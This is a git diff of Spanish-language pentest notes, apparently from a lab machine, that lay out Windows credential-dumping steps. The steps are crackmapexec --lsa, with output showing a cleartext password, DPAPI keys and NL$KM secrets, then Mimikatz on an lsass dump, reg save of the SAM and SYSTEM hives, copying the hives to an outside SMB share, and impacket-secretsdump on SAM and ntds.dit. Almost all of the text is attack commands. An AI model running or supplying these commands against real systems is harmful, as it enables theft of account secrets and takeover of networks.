@@ -1,38 +1,52 @@
 # Dumpear hashes desde el servicio smb, los hashes LSA que nos dara seran contrasenas encontradas de usuarios almacenadas
 
------------------
-	LSA
------------------
+    -----------------
+            LSA
+    -----------------
 
-# Crackmapexec
+--- Crackmapexec ---
 
-~$> crackmapexec smb 10.10.10.116 -u "<Username>" -p "<Password>" --lsa
+  ~$> crackmapexec smb 10.10.10.116 -u "<Username>" -p "<Password>" --lsa
 
-# Output 
-SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
-SMB         10.10.10.116    445    CONCEAL          [+] Conceal\rami:Rami1234#! (Pwn3d!)
-SMB         10.10.10.116    445    CONCEAL          [+] Dumping LSA secrets
-SMB         10.10.10.116    445    CONCEAL          dpapi_machinekey:0xfb86cefc72a6142ba3951477775010ad6bbb311 edpapi_userkey:0x38d17ff8d6d4501e70b44198c1887d743bde6220
-SMB         10.10.10.116    445    CONCEAL          NL$KM:96aefb76f39969d8ec85c5995b14d30166a16bd028d0c82a77c50d9f0b624ed93f0d979997ffc55fddd86844636bf90bf075d8e17f25aba545485c757735fd16
+  [+] Output :
+    SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
+    SMB         10.10.10.116    445    CONCEAL          [+] Conceal\rami:Rami1234#! (Pwn3d!)
+    SMB         10.10.10.116    445    CONCEAL          [+] Dumping LSA secrets
+    SMB         10.10.10.116    445    CONCEAL          dpapi_machinekey:0xfb86cefc72a6142ba3951477775010ad6bbb311 edpapi_userkey:0x38d17ff8d6d4501e70b44198c1887d743bde6220
+    SMB         10.10.10.116    445    CONCEAL          NL$KM:96aefb76f39969d8ec85c5995b14d30166a16bd028d0c82a77c50d9f0b624ed93f0d979997ffc55fddd86844636bf90bf075d8e17f25aba545485c757735fd16
 
-# Mimikatz
 
-privilege::debug
-sekurlsa::minidump C:\Users\Jaime\lsass.DMP
+--- Mimikatz ---
+
+  > privilege::debug
+  > sekurlsa::minidump C:\Users\Jaime\lsass.DMP
 
 ----------------------
-	SAM | SYTEM
+      SAM | SYTEM
 ----------------------
 
-# Ejecutamos el siguiente comando el cual nos copiaremos en el archivo sam.backup toda la sam
-~$> reg save HKLM\sam sam.backup
+[*] Ejecutamos el siguiente comando el cual nos copiaremos en el archivo sam.backup toda la sam
 
-# Ejecutamos este comando con el mismo contexto de antes
-~$> reg save HKLM\system system.backup
+  ~$> reg save HKLM\sam sam.backup
 
-# Nos traemos por smb los archivos
-~$> copy sam.backup \\10.10.14.57\smbFolder\sam
-~$> copy system.backup \\10.10.14.57\smbFolder\system
+[*] Ejecutamos este comando con el mismo contexto de antes
+
+  ~$> reg save HKLM\system system.backup
+
+[*] Nos traemos por smb los archivos
+
+  ~$> copy sam.backup \\10.10.14.57\smbFolder\sam
+  ~$> copy system.backup \\10.10.14.57\smbFolder\system
   
-# Con impacket-secretdump dumpearemos el contenido
-~$> impacket-secretsdump -sam sam -system system LOCAL
+[*] Con impacket-secretsdump dumpearemos el contenido
+
+  ~$> impacket-secretsdump -sam sam -system system LOCAL
+
+
+--------------
+     NTDS
+--------------
+
+[*] Lo dumpearemos de la siguiente manera, es necesario meter el SYSTEM debido a que no podremos operar sin un bootkey
+
+  ~$> impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
